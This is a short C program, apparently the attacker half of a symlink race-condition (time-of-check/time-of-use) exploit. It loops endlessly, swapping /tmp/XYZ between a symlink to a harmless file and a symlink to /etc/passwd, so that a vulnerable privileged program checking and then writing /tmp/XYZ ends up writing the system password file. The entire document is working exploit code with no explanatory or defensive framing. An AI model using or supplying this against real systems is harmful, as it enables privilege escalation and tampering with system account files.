#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int main(){
    while(1){
        unlink("/tmp/XYZ");
        symlink("/tmp/paperino", "/tmp/XYZ");
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
    }
}
